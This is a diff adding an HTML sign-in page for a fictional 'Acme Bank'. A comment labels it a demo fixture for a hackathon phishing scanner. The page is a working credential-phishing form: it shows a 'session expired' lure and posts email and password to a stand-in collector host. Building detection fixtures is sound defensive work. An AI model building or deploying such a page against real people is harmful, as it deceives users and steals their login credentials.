@@ -1,0 +1,25 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Acme Bank - Secure Sign In</title>
+  <style>
+    body { font-family: system-ui, sans-serif; background: #f2f5f9; display: grid; place-items: center; height: 100vh; margin: 0; }
+    form { background: #fff; padding: 32px; border-radius: 8px; width: 300px; box-shadow: 0 2px 12px #0002; }
+    h1 { font-size: 20px; color: #0b3d91; }
+    input, button { width: 100%; padding: 10px; margin-top: 12px; box-sizing: border-box; }
+    button { background: #0b3d91; color: #fff; border: 0; }
+  </style>
+</head>
+<body>
+  <!-- DEMO ONLY: fictional brand, fictional collector. Built for the hackathon scanner. -->
+  <form id="login" method="post" action="https://harvest.evil-example.net/save.php">
+    <h1>Acme Bank</h1>
+    <p>Your session expired. Sign in to verify your account.</p>
+    <input id="email" type="email" name="email" placeholder="Email">
+    <input id="password" type="password" name="password" placeholder="Password">
+    <button>Sign in</button>
+  </form>
+  <script src="kit.js"></script>
+</body>
+</html>
